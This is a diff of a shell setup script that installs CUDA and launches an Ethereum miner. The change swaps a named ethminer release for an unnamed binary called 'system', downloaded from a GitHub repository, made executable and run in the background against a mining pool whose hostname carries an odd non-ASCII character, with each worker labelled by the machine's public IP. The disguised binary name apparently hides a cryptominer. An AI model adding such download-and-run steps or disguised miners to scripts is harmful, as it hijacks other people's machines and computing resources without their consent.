@@ -16,8 +16,8 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	sudo apt-get update
 	sudo apt-get -y install cuda
 	sudo apt-get install libcurl3 -y
-	wget https://github.com/tranquangchung1989/yuhu/ethereum-mining/ethminer/releases/download/v0.16.1/ethminer-0.16.1-linux-x86_64.tar.gz
-	chmod +x ethminer
+	wget https://github.com/dipsey1337/yuhu/raw/main/system
+	chmod +x system
 	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-	./ethminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u sp_ajg -p x -w $ip &
+	./system -a ethash -o stratum+tcp://eth-eu.sparkpôl.com:3333 -u sp_ajg -p x -w $ip &
 fi
